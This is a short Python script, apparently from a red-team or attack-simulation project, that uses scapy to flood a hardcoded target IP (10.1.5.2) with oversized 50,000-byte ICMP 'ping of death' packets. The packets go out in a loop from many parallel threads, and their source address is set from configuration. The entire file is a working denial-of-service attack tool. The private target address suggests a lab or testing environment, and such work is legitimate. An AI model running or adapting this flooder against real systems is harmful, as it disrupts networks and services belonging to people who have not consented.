import threading
import time
from multiprocessing.pool import ThreadPool

from loguru import logger
from scapy.all import *

from red.config import config

TARGET_IP = "10.1.5.2"
stop = threading.Event()

def connection(_: None):
    while not stop.is_set():
        try:
            ping_of_death = IP(src=config.attack.ip, dst=TARGET_IP)/ICMP()/("A"*50000)
            send(ping_of_death)
        except TimeoutError:
            logger.info("Got a timeout :tada:!")

def run():
    threads = int(config.attack.cli.pps)
    logger.info(f"Starting with: "
                f"{threads} ")

    with ThreadPool(threads) as pool:
        pool.map(connection, [None] * threads)
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            stop.set()
